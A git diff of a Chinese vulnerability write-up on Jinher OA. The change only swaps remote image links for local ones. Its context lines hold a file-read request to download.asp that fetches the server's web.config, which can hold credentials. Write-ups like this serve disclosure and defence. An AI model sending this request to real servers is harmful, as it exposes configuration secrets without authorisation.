@@ -20,7 +20,7 @@ app="Jinher-OA"
 
 登录页面如下
 
-![1](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202090141493.png)
+![1](./images/202202090141493.png)
 
 
 
@@ -120,7 +120,7 @@ app="Jinher-OA"
 /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
 ```
 
-![2](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202090141014.png)
+![2](./images/202202090141014.png)
 
 读取 web.config
 
@@ -128,4 +128,4 @@ app="Jinher-OA"
 /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
 ```
 
-![3](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202090141775.png)
+![3](./images/202202090141775.png)
